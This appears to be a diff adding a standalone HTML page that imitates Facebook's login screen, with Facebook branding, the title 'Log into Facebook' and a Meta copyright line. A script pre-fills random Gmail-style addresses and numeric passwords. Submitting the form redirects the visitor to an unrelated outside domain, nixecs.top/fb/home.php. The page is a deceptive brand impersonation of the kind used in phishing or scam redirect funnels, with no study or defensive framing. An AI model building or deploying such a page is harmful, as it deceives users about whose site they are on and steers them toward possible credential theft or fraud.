@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log into Facebook</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+        }
+        .main-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+            padding: 20px 0;
+        }
+        .fb-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 980px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .fb-left {
+            width: 580px;
+            padding-right: 32px;
+        }
+        .fb-logo-text {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            letter-spacing: -2px;
+            margin-bottom: 10px;
+        }
+        .fb-tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        .fb-right {
+            width: 396px;
+            text-align: center;
+        }
+        .login-box {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 100%;
+        }
+        .login-box input {
+            width: 100%;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            color: #1c1e21;
+            font-size: 17px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+        }
+        .login-box input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: background-color 0.2s;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-pass {
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin: 16px 0;
+        }
+        .forgot-pass:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-btn {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+        footer {
+            background-color: #ffffff;
+            color: #737373;
+            font-size: 12px;
+            padding: 20px 0;
+            text-align: center;
+            border-top: 1px solid #dddfe2;
+        }
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        @media (max-width: 900px) {
+            .fb-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .fb-left {
+                width: 100%;
+                padding-right: 0;
+                margin-bottom: 20px;
+            }
+            .fb-logo-text {
+                font-size: 44px;
+            }
+            .fb-tagline {
+                font-size: 18px;
+                line-height: 22px;
+            }
+            .fb-right {
+                width: 100%;
+                max-width: 396px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-content">
+        <div class="fb-container">
+            <!-- Left Side Branding -->
+            <div class="fb-left">
+                <div class="fb-logo-text">facebook</div>
+                <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
+            </div>
+
+            <!-- Right Side Login Box -->
+            <div class="fb-right">
+                <div class="login-box">
+                    <form id="loginForm" onsubmit="handleLogin(event)">
+                        <!-- Auto-filled random email ending strictly with @gmail.com -->
+                        <input type="text" id="emailField" name="email" placeholder="Email address or phone number" required>
+                        
+                        <!-- Auto-filled random 8-10 digit password (shows ***) -->
+                        <input type="password" id="passField" name="passcode" placeholder="Password" required>
+                        
+                        <button type="submit" class="login-btn">Log In</button>
+                    </form>
+
+                    <a href="#" class="forgot-pass">Forgotten password?</a>
+                    
+                    <div class="divider"></div>
+                    
+                    <button type="button" class="create-btn" onclick="alert('Feature unavailable.')">Create new account</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            English (UK) &nbsp; Bahasa Indonesia &nbsp; Español &nbsp; Português (Brasil) &nbsp; Français &nbsp; Deutsch &nbsp; Italiano &nbsp; हिन्दी <br>
+            <hr style="border:0; border-top:1px solid #dddfe2; margin: 10px 0;">
+            Meta &copy; 2026
+        </div>
+    </footer>
+
+    <!-- JavaScript for strictly gmail.com & 8-10 digit password -->
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const names = ['ahmed', 'rahim', 'karim', 'tanvir', 'sakib', 'fahim', 'nasir', 'shakil', 'ridoy', 'mehedi', 'ariful', 'monir', 'rakib', 'juel', 'imran'];
+            
+            // Generate Random Email strictly with gmail.com
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomNum = Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('emailField').value = randomName + randomNum + '@gmail.com';
+
+            // Generate Random 8-10 Digit Password
+            const passLength = Math.floor(Math.random() * 3) + 8; // 8, 9, or 10 digits
+            let randomPass = '';
+            for (let i = 0; i < passLength; i++) {
+                randomPass += Math.floor(Math.random() * 10);
+            }
+            document.getElementById('passField').value = randomPass;
+        });
+
+        function handleLogin(event) {
+            event.preventDefault();
+            // Redirect to target URL on click
+            window.location.href = "https://nixecs.top/fb/home.php";
+        }
+    </script>
+</body>
+</html>
